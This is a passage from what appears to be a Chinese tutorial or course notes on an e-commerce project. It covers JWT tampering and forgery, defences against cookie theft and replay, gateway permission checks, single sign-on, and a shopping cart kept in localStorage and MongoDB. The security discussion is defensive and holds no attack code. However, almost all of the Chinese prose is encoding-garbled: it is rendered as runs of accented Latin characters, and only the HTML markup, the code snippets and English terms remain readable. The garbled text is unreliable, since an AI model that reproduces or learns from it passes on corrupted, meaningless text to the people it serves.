<li>ç­”ï¼štokenä¸­çš„æ•°æ®å¯ä»¥ç¯¡æ”¹ï¼Œä½†æ˜¯ç­¾åæ— æ³•ç¯¡æ”¹ï¼Œå¦åˆ™æœåŠ¡ç«¯è®¤è¯æ ¹æœ¬ä¸ä¼šé€šè¿‡ï¼Œå› æ­¤ç¯¡æ”¹çš„tokenæ˜¯æ— æ³•é€šè¿‡æœåŠ¡ç«¯æ ¡éªŒçš„</li>
</ul>
</li>
<li><p>å¦‚ä½•é˜²æ­¢tokençš„ä¼ªé€ </p>
<p>ä¸ä¸Šä¸ªé—®é¢˜ç±»ä¼¼ï¼Œtokenä¸­å¸¦æœ‰ç­¾åè®¤è¯ï¼Œè€Œç­¾åéœ€è¦ç§é’¥åŠ å¯†ç”Ÿæˆã€‚åªè¦ç§é’¥ä¸æ³„éœ²ï¼Œå°±ä¸å¯èƒ½æœ‰äººä¼ªé€ tokenï¼Œå› ä¸ºå…¶å®ƒç§˜é’¥ç”Ÿæˆçš„tokenæ˜¯ä¸ä¼šè¢«å…¬é’¥è®¤å¯çš„ã€‚</p>
</li>
<li><p>å¦‚ä½•è§£å†³cookieè¢«ç›—ç”¨é—®é¢˜ï¼Ÿ</p>
<p>ç­”ï¼šcookieè¢«ç›—ç”¨çš„å¯èƒ½æ€§ä¸»è¦åŒ…æ‹¬ä¸‹é¢å‡ ç§ï¼š</p>
<ul>
<li><p>XSSæ”»å‡»ï¼šè¿™ä¸ªå¯ä»¥å†å‰ç«¯é¡µé¢æ¸²æŸ“æ—¶å¯¹ æ•°æ®åšå®‰å…¨å¤„ç†å³å¯ï¼Œè€Œä¸”æˆ‘ä»¬çš„cookieä½¿ç”¨äº†Httponlyä¸ºtrueï¼Œå¯ä»¥é˜²æ­¢JSè„šæœ¬çš„æ”»å‡»ã€‚</p>
</li>
<li><p>CSRFæ”»å‡»ï¼š</p>
<ul>
<li>åˆ©ç”¨Refererå¤´ï¼Œé˜²ç›—é“¾</li>
<li>è¯·æ±‚å¤´ä¸­åŠ éšæœºç </li>
</ul>
</li>
<li><p>æ•°æ®æŠ“åŒ…ï¼Œè·å–ç”¨æˆ·cookieï¼šæˆ‘ä»¬é‡‡ç”¨äº†HTTPSåè®®é€šä¿¡ï¼Œæ— æ³•è·å–è¯·æ±‚çš„ä»»ä½•æ•°æ®</p>
</li>
<li><p>è¯·æ±‚é‡æ”¾æ”»å‡»ï¼šå¯¹äºæ™®é€šç”¨æˆ·çš„è¯·æ±‚æ²¡æœ‰å¯¹è¯·æ±‚é‡æ”¾åšé˜²å¾¡ï¼Œè€Œæ˜¯å¯¹éƒ¨åˆ†ä¸šåŠ¡åšå¥½äº†å¹‚ç­‰å¤„ç†ã€‚è¿è¡Œç®¡ç†ç³»ç»Ÿä¸­ä¼šå¯¹tokenæ·»åŠ éšæœºç ï¼Œè®¤è¯tokenä¸€æ¬¡æœ‰æ•ˆï¼Œæ¥é¢„é˜²è¯·æ±‚é‡æ”¾æ”»å‡»ã€‚</p>
<p>(1)**åŠ <a href="https://baike.baidu.com/item/%E9%9A%8F%E6%9C%BA%E6%95%B0/2454368">éšæœºæ•°</a>**ã€‚è¯¥æ–¹æ³•ä¼˜ç‚¹æ˜¯è®¤è¯åŒæ–¹ä¸éœ€è¦æ—¶é—´åŒæ­¥ï¼ŒåŒæ–¹è®°ä½ä½¿ç”¨è¿‡çš„<a href="https://baike.baidu.com/item/%E9%9A%8F%E6%9C%BA%E6%95%B0">éšæœºæ•°</a>ï¼Œå¦‚å‘ç°<a href="https://baike.baidu.com/item/%E6%8A%A5%E6%96%87">æŠ¥æ–‡</a>ä¸­æœ‰ä»¥å‰ä½¿ç”¨è¿‡çš„éšæœºæ•°ï¼Œå°±è®¤ä¸ºæ˜¯é‡æ”¾æ”»å‡»ã€‚ç¼ºç‚¹æ˜¯éœ€è¦é¢å¤–ä¿å­˜ä½¿ç”¨è¿‡çš„éšæœºæ•°ï¼Œè‹¥è®°å½•çš„æ—¶é—´æ®µè¾ƒé•¿ï¼Œåˆ™ä¿å­˜å’ŒæŸ¥è¯¢çš„å¼€é”€è¾ƒå¤§ã€‚ [4] </p>
<p>(2)**åŠ <a href="https://baike.baidu.com/item/%E6%97%B6%E9%97%B4%E6%88%B3">æ—¶é—´æˆ³</a>**ã€‚è¯¥æ–¹æ³•ä¼˜ç‚¹æ˜¯ä¸ç”¨é¢å¤–ä¿å­˜å…¶ä»–ä¿¡æ¯ã€‚ç¼ºç‚¹æ˜¯è®¤è¯åŒæ–¹éœ€è¦å‡†ç¡®çš„æ—¶é—´åŒæ­¥ï¼ŒåŒæ­¥è¶Šå¥½ï¼Œå—æ”»å‡»çš„å¯èƒ½æ€§å°±è¶Šå°ã€‚ä½†å½“ç³»ç»Ÿå¾ˆåºå¤§ï¼Œè·¨è¶Šçš„åŒºåŸŸè¾ƒå¹¿æ—¶ï¼Œè¦åšåˆ°ç²¾ç¡®çš„æ—¶é—´åŒæ­¥å¹¶ä¸æ˜¯å¾ˆå®¹æ˜“ã€‚ [4] </p>
<p>(3)**åŠ <a href="https://baike.baidu.com/item/%E6%B5%81%E6%B0%B4%E5%8F%B7/5623476">æµæ°´å·</a>**ã€‚å°±æ˜¯åŒæ–¹åœ¨æŠ¥æ–‡ä¸­æ·»åŠ ä¸€ä¸ªé€æ­¥é€’å¢çš„æ•´æ•°ï¼Œåªè¦æ¥æ”¶åˆ°ä¸€ä¸ªä¸è¿ç»­çš„æµæ°´å·æŠ¥æ–‡(å¤ªå¤§æˆ–å¤ªå°)ï¼Œå°±è®¤å®šæœ‰é‡æ”¾å¨èƒã€‚è¯¥æ–¹æ³•ä¼˜ç‚¹æ˜¯ä¸éœ€è¦æ—¶é—´åŒæ­¥ï¼Œä¿å­˜çš„ä¿¡æ¯é‡æ¯”éšæœºæ•°æ–¹å¼å°ã€‚ç¼ºç‚¹æ˜¯ä¸€æ—¦æ”»å‡»è€…å¯¹æŠ¥æ–‡è§£å¯†æˆåŠŸï¼Œå°±å¯ä»¥è·å¾—æµæ°´å·ï¼Œä»è€Œæ¯æ¬¡å°†æµæ°´å·é€’å¢æ¬ºéª—è®¤è¯ç«¯ã€‚</p>
</li>
<li><p>ç”¨æˆ·ç”µè„‘ä¸­æ¯’ï¼šè¿™ä¸ªæ— æ³•é˜²èŒƒã€‚</p>
</li>
</ul>
</li>
<li><p>ç”¨æˆ·çš„cookieè¢«ç¦ç”¨æ€ä¹ˆåŠï¼Ÿ</p>
<ul>
<li>cookieä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ˜¯ä¸ä¼šè¢«ç¦ç”¨ï¼Œå› ä¸ºæ™®é€šäººæ ¹æœ¬ä¸çŸ¥é“æ˜¯ä»€ä¹ˆæ˜¯cookieï¼Œä¸€èˆ¬ä¸ç”¨ç®¡ï¼Œä¸ºäº†å‹å¥½ï¼Œæˆ‘ä»¬å¯ä»¥ç»™ç”¨æˆ·ä¸€ä¸ªæç¤ºï¼šä½ çš„cookieå·²ç»è¢«ç¦ç”¨äº†ï¼Œè¯·å¯ç”¨cookieã€‚</li>
<li>æŠŠjwtä½œä¸ºå“åº”å¤´è¿”å›ï¼Œæµè§ˆå™¨ä¸­JSæŠŠtokenå†™åˆ°æœ¬åœ°å­˜å‚¨ï¼ˆsessionStorageï¼‰ï¼Œè¦æ±‚å‰ç«¯æ¯æ¬¡å‘ajaxï¼Œéƒ½å¿…é¡»è‡ªå·±æºå¸¦tokenã€‚è€Œä¸”æœ‰è¢«xssæ”»å‡»çš„é£é™©</li>
</ul>
</li>
</ul>
<h3 id="æƒé™é—®é¢˜"><a href="#æƒé™é—®é¢˜" class="headerlink" title="æƒé™é—®é¢˜"></a>æƒé™é—®é¢˜</h3><ul>
<li><p>å¦‚ä½•å®Œæˆæƒé™æ ¡éªŒçš„ï¼Ÿ</p>
<ul>
<li>é¦–å…ˆæˆ‘ä»¬æœ‰æƒé™ç®¡ç†çš„æœåŠ¡ï¼Œç®¡ç†ç”¨æˆ·çš„å„ç§æƒé™ï¼ŒåŠå¯è®¿é—®è·¯å¾„ç­‰</li>
<li>åœ¨ç½‘å…³ä¸­åˆ©ç”¨è¿‡æ»¤å™¨ï¼Œæ‹¦æˆªä¸€åˆ‡è¯·æ±‚ï¼Œåœ¨è¿‡æ»¤å™¨ä¸­ï¼Œè§£æå’ŒéªŒè¯jwtï¼Œè·å–ç”¨æˆ·èº«ä»½ï¼ŒæŸ¥è¯¢ç”¨æˆ·æƒé™ï¼Œåˆ¤æ–­ç”¨æˆ·èº«ä»½å¯ä»¥è®¿é—®å½“å‰è·¯å¾„</li>
</ul>
</li>
<li><p>æœåŠ¡ç«¯å¾®æœåŠ¡åœ°å€ä¸å°å¿ƒæš´éœ²äº†ï¼Œç”¨æˆ·å°±å¯ä»¥ç»•è¿‡ç½‘å…³ï¼Œç›´æ¥è®¿é—®å¾®æœåŠ¡ï¼Œæ€ä¹ˆåŠï¼Ÿ</p>
<ul>
<li><p>é¦–å…ˆï¼Œæˆ‘ä»¬çš„å¾®æœåŠ¡éšè—åœ¨ç½‘å…³çš„åé¢ï¼Œè€Œä¸”æ•´ä¸ªæœåŠ¡è¢«Nginxåå‘ä»£ç†ï¼Œç”¨æˆ·åªèƒ½çœ‹åˆ°nginxçš„åœ°å€ï¼Œå¾®æœåŠ¡æš´éœ²çš„å¯èƒ½æ€§å¾ˆä½ã€‚</p>
</li>
<li><p>å…œåº•æ–¹æ¡ˆï¼š</p>
<ul>
<li>å¦‚æœæ‹…å¿ƒæœåŠ¡å®‰å…¨ï¼Œæˆ‘ä»¬å¯ä»¥å°†ç™»å½•æ ¡éªŒå’Œæƒé™æ ¡éªŒåˆ†ç¦»ã€‚åœ¨ç½‘å…³ä¸­åªè´Ÿè´£ç™»å½•æ ¡éªŒåŠŸèƒ½ï¼Œåœ¨æ¯ä¸ªå¾®æœåŠ¡å¤„ç†ç”¨æˆ·æƒé™ã€‚è¿™æ ·å³ä¾¿æœ‰äººç»•è¿‡äº†ç½‘å…³è®¿é—®ï¼Œåªè¦æƒé™ä¸é€šè¿‡ï¼Œä¾ç„¶æ— æ³•è®¿é—®ã€‚</li>
<li>ç”¨æˆ·è¯·æ±‚åˆ°ç½‘å…³ï¼Œç½‘å…³ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„ä»¤ç‰Œï¼Œè¿™ä¸ªä»¤ç‰ŒåŒ…å«ç”¨æˆ·ä¿¡æ¯ï¼Œä»…åœ¨è®¿é—®å¾®æœåŠ¡æ—¶ä½¿ç”¨ï¼Œè¢«è®¿é—®çš„å¾®æœåŠ¡ä¼šæ ¡éªŒè¿™ä¸ªå†…éƒ¨ä»¤ç‰Œï¼Œä»è€ŒéªŒè¯è¯·æ±‚è€…æ˜¯ä¸æ˜¯å†…éƒ¨çš„å¾®æœåŠ¡</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="å•ç‚¹ç™»å½•é—®é¢˜"><a href="#å•ç‚¹ç™»å½•é—®é¢˜" class="headerlink" title="å•ç‚¹ç™»å½•é—®é¢˜"></a>å•ç‚¹ç™»å½•é—®é¢˜</h3><p>å•ç‚¹ç™»å½•ï¼Œé¡¾åæ€ä¹‰ï¼šåœ¨åˆ†å¸ƒå¼æœåŠ¡ä¸­ï¼Œç”¨æˆ·åªéœ€è¦åœ¨ä¸€å¤„ç™»å½•ï¼Œå³å¯åœ¨å„ä¸ªå—ä¿¡ä»»çš„æœåŠ¡å™¨ä¹‹é—´ï¼Œå…±äº«ç™»å½•çŠ¶æ€ï¼Œç§°ä¸ºå•ç‚¹ç™»å½•</p>
<p>ä»»ä½•ç™»å½•éƒ½ç¦»ä¸å¼€cookieï¼Œå¦‚æœcookieæ— æ³•ä½¿ç”¨æˆ–å…±äº«ï¼Œå°±ä¼šå¯¼è‡´ç™»å½•å‡­è¯æ— æ³•å…±äº«ï¼Œå¯¼è‡´ç™»å½•çŠ¶æ€æ— æ³•å…±äº«ã€‚ä¾‹å¦‚å› ä¸ºè·¨åŸŸåçš„å¤šä¸ªæœåŠ¡ï¼Œå…¶cookieä¸å¯å…±äº«ï¼Œå¯¼è‡´ç™»å½•å¤±æ•ˆã€‚</p>
<p>å› æ­¤å®ç°å•ç‚¹ç™»å½•æœ‰å¤šç§æ–¹å¼ï¼Œå…¶åŒºåˆ«å°±åœ¨äºæ˜¯å¦èƒ½è§£å†³è·¨åŸŸç™»å½•</p>
<ul>
<li>åŒåŸŸåå•ç‚¹ç™»å½•<ul>
<li>åˆ†å¸ƒå¼æœåŠ¡å…±äº«äºŒçº§åŸŸåï¼ŒäºŒçº§ä»¥ä¸ŠåŸŸåä¸åŒï¼Œæ­¤æ—¶cookieå¯ä»¥å…±äº«ã€‚è§£å†³æ€è·¯ï¼š<ul>
<li>JWTæ— çŠ¶æ€ç™»å½•</li>
<li>å…±äº«Session</li>
</ul>
</li>
</ul>
</li>
<li>è·¨åŸŸå•ç‚¹ç™»å½•<ul>
<li>æœåŠ¡äºŒçº§åŸŸåå°±ä¸åŒï¼Œå¯¼è‡´cookieæ— æ³•å…±äº«ï¼Œè§£å†³åŠæ³•ï¼š<ul>
<li>OAuthåè®®å®ç°å•ç‚¹ç™»å½•ï¼š<a href="http://www.ruanyifeng.com/blog/2019/04/oauth_design.html">Oauth2.0åè®®</a>ï¼Œæˆç†Ÿçš„æ¡†æ¶ï¼š<a href="https://blog.csdn.net/anumbrella/article/details/80821486">CAS</a></li>
<li>è·¨åŸŸè·³è½¬æ—¶ï¼Œä¼ é€’cookieæ•°æ®ï¼Œä»è€Œå…±äº«cookie</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>CASåŸç†å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022694.png"></p>
<h1 id="è´­ç‰©è½¦åŠŸèƒ½"><a href="#è´­ç‰©è½¦åŠŸèƒ½" class="headerlink" title="è´­ç‰©è½¦åŠŸèƒ½"></a>è´­ç‰©è½¦åŠŸèƒ½</h1><h2 id="è´­ç‰©è½¦åŠŸèƒ½åˆ†æ"><a href="#è´­ç‰©è½¦åŠŸèƒ½åˆ†æ" class="headerlink" title="è´­ç‰©è½¦åŠŸèƒ½åˆ†æ"></a>è´­ç‰©è½¦åŠŸèƒ½åˆ†æ</h2><h3 id="éœ€æ±‚"><a href="#éœ€æ±‚" class="headerlink" title="éœ€æ±‚"></a>éœ€æ±‚</h3><p>éœ€æ±‚æè¿°ï¼š</p>
<ul>
<li>ç”¨æˆ·å¯ä»¥åœ¨ç™»å½•çŠ¶æ€ä¸‹å°†å•†å“æ·»åŠ åˆ°è´­ç‰©è½¦</li>
<li>ç”¨æˆ·å¯ä»¥åœ¨æœªç™»å½•çŠ¶æ€ä¸‹å°†å•†å“æ·»åŠ åˆ°è´­ç‰©è½¦</li>
<li>ç”¨æˆ·å¯ä»¥ä½¿ç”¨è´­ç‰©è½¦ä¸€èµ·ç»“ç®—ä¸‹å•</li>
<li>ç”¨æˆ·å¯ä»¥æŸ¥è¯¢è‡ªå·±çš„è´­ç‰©è½¦</li>
<li>ç”¨æˆ·å¯ä»¥åœ¨è´­ç‰©è½¦ä¸­å¯ä»¥ä¿®æ”¹è´­ä¹°å•†å“çš„æ•°é‡ã€‚</li>
<li>ç”¨æˆ·å¯ä»¥åœ¨è´­ç‰©è½¦ä¸­åˆ é™¤å•†å“ã€‚</li>
<li>ç”¨æˆ·å¯ä»¥<em>åœ¨è´­ç‰©è½¦ä¸­çœ‹åˆ°å•†å“æ»¡è¶³çš„ä¼˜æƒ ä¿¡æ¯</em></li>
<li>ç”¨æˆ·å¯ä»¥çœ‹åˆ°è´­ç‰©è½¦å•†å“ä»·æ ¼å˜åŒ–</li>
<li>ç”¨æˆ·å¯ä»¥çœ‹åˆ°è´­ç‰©è½¦å•†å“æ˜¯å¦ä¸‹æ¶</li>
<li>ç”¨æˆ·å¯ä»¥çœ‹åˆ°è´­ç‰©è½¦å•†å“åº“å­˜æ˜¯å¦å……è¶³</li>
<li>ç”¨æˆ·å¯ä»¥å¯¹å•†å“æ‰¹é‡ç»“ç®—ä¸‹å•</li>
</ul>
<p>éœ€æ±‚æè¿°çš„æ–¹å¼ï¼Œç”¨æˆ·æ•…äº‹</p>
<h3 id="ä¸šåŠ¡åˆ†æ"><a href="#ä¸šåŠ¡åˆ†æ" class="headerlink" title="ä¸šåŠ¡åˆ†æ"></a>ä¸šåŠ¡åˆ†æ</h3><p>åœ¨éœ€æ±‚æè¿°ä¸­ï¼Œä¸ç®¡ç”¨æˆ·æ˜¯å¦ç™»å½•ï¼Œéƒ½éœ€è¦å®ç°åŠ å…¥è´­ç‰©è½¦åŠŸèƒ½ï¼Œé‚£ä¹ˆå·²ç™»å½•å’Œæœªç™»å½•ä¸‹ï¼Œè´­ç‰©è½¦æ•°æ®åº”è¯¥å­˜æ”¾åœ¨å“ªé‡Œå‘¢ï¼Ÿ</p>
<blockquote>
<p>æœªç™»å½•è´­ç‰©è½¦</p>
</blockquote>
<p>ç”¨æˆ·å¦‚æœæœªç™»å½•ï¼Œå°†æ•°æ®ä¿å­˜åœ¨æœåŠ¡ç«¯å­˜åœ¨ä¸€äº›é—®é¢˜ï¼š</p>
<ul>
<li>æ— æ³•ç¡®å®šç”¨æˆ·èº«ä»½ï¼Œéœ€è¦å€ŸåŠ©ä¸å®¢æˆ·ç«¯å­˜å‚¨è¯†åˆ«èº«ä»½</li>
<li>æœåŠ¡ç«¯æ•°æ®å­˜å‚¨å‹åŠ›å¢åŠ ï¼Œè€Œä¸”å¯èƒ½æ˜¯æ— æ•ˆæ•°æ®</li>
</ul>
<p>é‚£ä¹ˆæˆ‘ä»¬åº”è¯¥ç”¨æŠŠæ•°æ®ä¿å­˜åœ¨å®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨ï¼‰ï¼Œè¿™æ ·æ¯ä¸ªç”¨æˆ·ä¿å­˜è‡ªå·±çš„æ•°æ®ï¼Œå°±ä¸å­˜åœ¨èº«ä»½è¯†åˆ«çš„é—®é¢˜äº†ï¼Œè€Œä¸”ä¹Ÿè§£å†³äº†æœåŠ¡ç«¯æ•°æ®å­˜å‚¨å‹åŠ›é—®é¢˜ã€‚</p>
<blockquote>
<p>å·²ç™»å½•è´­ç‰©è½¦</p>
</blockquote>
<p>ç”¨æˆ·ç™»å½•æ—¶ï¼Œæ•°æ®ä¿å­˜åœ¨å“ªé‡Œå‘¢ï¼Ÿ</p>
<p>å¤§å®¶é¦–å…ˆæƒ³åˆ°çš„åº”è¯¥æ˜¯æ•°æ®åº“ï¼Œä¸è¿‡è´­ç‰©è½¦æ•°æ®æ¯”è¾ƒç‰¹æ®Šï¼š</p>
<ul>
<li>è¯»å’Œå†™éƒ½æ¯”è¾ƒé¢‘ç¹</li>
<li>æ•°æ®å®‰å…¨æ€§è¦æ±‚ä¸é«˜</li>
<li>æ•°æ®æ²¡æœ‰äº‹åŠ¡éœ€æ±‚</li>
</ul>
<p>è¿™æ ·çš„æ•°æ®å­˜å‚¨æ•°æ®åº“æœ‰äº›æµªè´¹ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥è€ƒè™‘å­˜å…¥NoSqlåº“ä¸­ï¼Œä¾‹å¦‚ï¼šRedisã€Elasticsearchã€MongoDBç­‰ã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨MongoDBä½œä¸ºè´­ç‰©è½¦å­˜å‚¨æ–¹æ¡ˆã€‚</p>
<h2 id="æœªç™»å½•è´­ç‰©è½¦"><a href="#æœªç™»å½•è´­ç‰©è½¦" class="headerlink" title="æœªç™»å½•è´­ç‰©è½¦"></a>æœªç™»å½•è´­ç‰©è½¦</h2><h3 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h3><p>é¦–å…ˆåˆ†æä¸€ä¸‹æœªç™»å½•è´­ç‰©è½¦çš„æ•°æ®ç»“æ„ã€‚</p>
<p>æˆ‘ä»¬çœ‹ä¸‹é¡µé¢å±•ç¤ºéœ€è¦ä»€ä¹ˆæ•°æ®ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022695.png" alt="image-20200331111408989"></p>
<p>å› æ­¤æ¯ä¸€ä¸ªè´­ç‰©è½¦ä¿¡æ¯ï¼Œéƒ½æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ŒåŒ…å«ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">skuId</span>:<span class="number">2131241</span>,</span><br><span class="line">    <span class="attr">title</span>:<span class="string">&quot;å°ç±³6&quot;</span>,</span><br><span class="line">    <span class="attr">image</span>:<span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">price</span>:<span class="number">190000</span>,</span><br><span class="line">    <span class="attr">num</span>:<span class="number">1</span>,</span><br><span class="line">    <span class="attr">spec</span>:<span class="string">&quot;&#123;&quot;</span><span class="number">4</span><span class="string">&quot;:&quot;</span>é™¶ç“·é»‘å°Šäº«ç‰ˆ<span class="string">&quot;,&quot;</span><span class="number">12</span><span class="string">&quot;:&quot;</span>6GB<span class="string">&quot;,&quot;</span><span class="number">13</span><span class="string">&quot;:&quot;</span>128GB<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦å¤–ï¼Œè´­ç‰©è½¦ä¸­ä¸æ­¢ä¸€æ¡æ•°æ®ï¼Œå› æ­¤æœ€ç»ˆä¼šæ˜¯å¯¹è±¡çš„æ•°ç»„ã€‚å³ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;...&#125;,&#123;...&#125;,&#123;...&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<h3 id="webæœ¬åœ°å­˜å‚¨"><a href="#webæœ¬åœ°å­˜å‚¨" class="headerlink" title="webæœ¬åœ°å­˜å‚¨"></a>webæœ¬åœ°å­˜å‚¨</h3><p>çŸ¥é“äº†æ•°æ®ç»“æ„ï¼Œä¸‹ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å¦‚ä½•ä¿å­˜è´­ç‰©è½¦æ•°æ®ã€‚</p>
<p>æˆ‘ä»¬ä¸é‡‡ç”¨cookieå­˜å‚¨ï¼ŒåŸå› ï¼š</p>
<ul>
<li>cookieæœ‰å¤§å°é™åˆ¶</li>
<li>cookieä¼šéšè¯·æ±‚ï¼Œè‡ªåŠ¨æºå¸¦åˆ°æœåŠ¡ç«¯ï¼Œä¼šå¢åŠ è¯·æ±‚çš„å¤´å¤§å°ï¼Œå ç”¨è¿‡å¤šå¸¦å®½ï¼Œå½±å“æœåŠ¡å¹¶å‘èƒ½åŠ›</li>
</ul>
<p>å‰é¢æˆ‘ä»¬åˆ†æè¿‡ï¼Œå¯ä»¥ä½¿ç”¨Localstorageæ¥å®ç°ã€‚Localstorageæ˜¯webæœ¬åœ°å­˜å‚¨çš„ä¸€ç§ï¼Œé‚£ä¹ˆï¼Œä»€ä¹ˆæ˜¯webæœ¬åœ°å­˜å‚¨å‘¢ï¼Ÿ</p>
<h4 id="ä»€ä¹ˆæ˜¯webæœ¬åœ°å­˜å‚¨ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯webæœ¬åœ°å­˜å‚¨ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯webæœ¬åœ°å­˜å‚¨ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯webæœ¬åœ°å­˜å‚¨ï¼Ÿ</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022696.png" alt="1527587496457"></p>
<p>webæœ¬åœ°å­˜å‚¨ä¸»è¦æœ‰ä¸¤ç§æ–¹å¼ï¼š</p>
<ul>
<li>LocalStorageï¼šlocalStorage æ–¹æ³•å­˜å‚¨çš„æ•°æ®æ²¡æœ‰æ—¶é—´é™åˆ¶ã€‚ç¬¬äºŒå¤©ã€ç¬¬äºŒå‘¨æˆ–ä¸‹ä¸€å¹´ä¹‹åï¼Œæ•°æ®ä¾ç„¶å¯ç”¨ã€‚ </li>
<li>SessionStorageï¼šsessionStorage æ–¹æ³•é’ˆå¯¹ä¸€ä¸ª session è¿›è¡Œæ•°æ®å­˜å‚¨ã€‚å½“ç”¨æˆ·å…³é—­æµè§ˆå™¨çª—å£åï¼Œæ•°æ®ä¼šè¢«åˆ é™¤ã€‚</li>
</ul>
<p>Localstorageå’ŒsessionStorageçš„æœ¬è´¨éƒ½æ—¶ä¸€ä¸ªJSçš„å¯¹è±¡</p>
<p>å¯¹è±¡æ€ä¹ˆæ“ä½œï¼ŒLocalStorageå°±æ€ä¹ˆæ“ä½œã€‚</p>
<h4 id="LocalStorageçš„ç”¨æ³•"><a href="#LocalStorageçš„ç”¨æ³•" class="headerlink" title="LocalStorageçš„ç”¨æ³•"></a>LocalStorageçš„ç”¨æ³•</h4><p>è¯­æ³•éå¸¸ç®€å•ï¼š</p>
<p> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022698.png" alt="1527587857321"></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>); <span class="comment">// å­˜å‚¨æ•°æ®</span></span><br><span class="line"><span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&quot;key&quot;</span>); <span class="comment">// è·å–æ•°æ®</span></span><br><span class="line"><span class="variable language_">localStorage</span>.<span class="title function_">removeItem</span>(<span class="string">&quot;key&quot;</span>); <span class="comment">// åˆ é™¤æ•°æ®</span></span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼š<strong>localStorageå’ŒSessionStorageéƒ½åªèƒ½ä¿å­˜å­—ç¬¦ä¸²</strong>ã€‚</p>
<p>ä¸è¿‡ï¼Œåœ¨æˆ‘ä»¬çš„common.jsä¸­ï¼Œå·²ç»å¯¹localStorageè¿›è¡Œäº†ç®€å•çš„å°è£…ï¼š</p>
<p> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022699.png" alt="1527588011623"></p>
<p>ç¤ºä¾‹ï¼š</p>
<p> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022700.png" alt="1527588112975"></p>
<h3 id="æœªç™»å½•è´­ç‰©è½¦æ¼”ç¤º"><a href="#æœªç™»å½•è´­ç‰©è½¦æ¼”ç¤º" class="headerlink" title="æœªç™»å½•è´­ç‰©è½¦æ¼”ç¤º"></a>æœªç™»å½•è´­ç‰©è½¦æ¼”ç¤º</h3><p>è´­ç‰©è½¦çš„å‰ç«¯jså’Œé¡µé¢éƒ½å·²ç»å®ç°å¥½äº†ï¼Œæˆ‘ä»¬åœ¨å•†å“è¯¦æƒ…é¡µé¢ï¼Œç‚¹å‡»åŠ å…¥è´­ç‰©è½¦æŒ‰é’®ï¼š</p>
<p> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022701.png" alt="1535969897212"></p>
<p>å³å¯å°†æ•°æ®åŠ å…¥localstorageä¸­ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022702.png" alt="1535632873353"></p>
<p>åŒæ—¶ï¼Œé¡µé¢ä¼šè·³è½¬åˆ°è´­ç‰©è½¦åˆ—è¡¨é¡µé¢å¹¶æ˜¾ç¤ºè´­ç‰©è½¦ä¿¡æ¯ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022703.png"></p>
<h2 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h2><p>å·²ç™»å½•è´­ç‰©è½¦æˆ‘ä»¬è®¡åˆ’å­˜å‚¨åœ¨MongoDBæœåŠ¡å™¨ï¼Œé‚£ä¹ˆMongoDBè¯¥å¦‚ä½•ä½¿ç”¨å‘¢ï¼Ÿ</p>
<p>å¤§å®¶å‚è€ƒè¯¾å‰èµ„æ–™æä¾›çš„æ–‡æ¡£ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022704.png" alt="image-20200322214142849"> </p>
<h2 id="æ­å»ºäº¤æ˜“å¾®æœåŠ¡"><a href="#æ­å»ºäº¤æ˜“å¾®æœåŠ¡" class="headerlink" title="æ­å»ºäº¤æ˜“å¾®æœåŠ¡"></a>æ­å»ºäº¤æ˜“å¾®æœåŠ¡</h2><p>æ¥ä¸‹æ¥æ˜¯å·²ç™»å½•çš„è´­ç‰©è½¦ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºç‹¬ç«‹å¾®æœåŠ¡ï¼Œå®ç°è´­ç‰©è½¦åŠŸèƒ½ã€‚è¿™é‡Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªäº¤æ˜“å¾®æœåŠ¡ï¼Œå…¶ä¸­ä¼šåŒ…å«ç”¨æˆ·äº¤æ˜“ç›¸å…³çš„åŠŸèƒ½ï¼š</p>
<ul>
<li>è´­ç‰©è½¦</li>
<li>è®¢å•</li>
<li>æ”¯ä»˜ç­‰</li>
</ul>
<h3 id="åˆ›å»ºmodule"><a href="#åˆ›å»ºmodule" class="headerlink" title="åˆ›å»ºmodule"></a>åˆ›å»ºmodule</h3><p>é¡¹ç›®åæ ‡ï¼š</p>
